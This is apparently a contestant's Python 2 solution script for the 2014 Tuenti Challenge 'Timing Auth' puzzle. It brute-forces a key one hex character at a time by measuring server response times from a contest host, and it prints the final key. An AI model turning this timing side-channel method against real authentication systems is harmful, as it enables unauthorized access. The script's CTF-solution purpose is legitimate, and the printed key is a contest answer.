#!/usr/bin/env python
# -*- coding: utf-8 -*-

########################################## 
#   
#  #TuentiChallenge4 (2014).
#  Challenge 13:  Tuenti Timing Auth
#  https://contest.tuenti.net/Challenges?id=2
#  Isaac Roldan (@saky)
#  
##########################################

#One of the hacking challenges, there were a lof of clues in this one :)
# like "side channel", "timming auth",...

# This algorithm is not automated to find the key, i executed it each time to find 
# the correct character in each iteration
# the correct character is the one that returns a bigger time in the results page

import urllib
import urllib2
import re

### USE THIS TO FIND CHARACTERS THAT TAKES MORE TIME:
chars = "1234567890abcdef"
for ch in chars:
	url = 'http://54.83.207.90:4242/?debug=1'
	values = {'input' : 'c5a288d5f0',
	          'key' : ""+ch,
	          'submit' : 'Enviar' }

	data = urllib.urlencode(values)
	req = urllib2.Request(url, data)
	response = urllib2.urlopen(req)
	the_page = response.read()
	a = re.search("Total run.+",the_page)
	print a.group(0) + "("+ch+")"

#final key for my input!!!
print "e39dacec66"